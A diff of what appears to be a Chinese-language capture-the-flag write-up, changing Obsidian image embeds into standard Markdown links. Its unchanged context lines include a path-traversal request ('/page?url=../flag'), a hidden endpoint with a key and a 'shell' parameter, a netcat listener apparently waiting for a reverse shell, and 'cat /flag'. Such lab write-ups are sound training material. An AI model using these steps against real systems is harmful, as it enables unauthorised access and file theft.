@@ -1,13 +1,13 @@
-![[Pasted image 20230104083639.png|500]]
+![](<./img/Pasted image 20230104083639.png>)
 
 ---
 首页长这样
 
-![[Pasted image 20230104083703.png]]
+![](<./img/Pasted image 20230104083703.png>)
 
 朴实无华.jpg
 
-![[Pasted image 20230104083746.png]]
+![](<./img/Pasted image 20230104083746.png>)
 
 ```php
 /page?url=../flag
@@ -107,7 +107,7 @@ no_one_know_the_manager?key=kE2V+hdkhIPOUAJKRtlII96sVqUxsIZiOhjWOqcRr24=&shell=b
 nc -lvp 7777
 ```
 
-![[Pasted image 20230104094436.png|1000]]
+![](<./img/Pasted image 20230104094436.png>)
 
 ```shell
 cat /flag
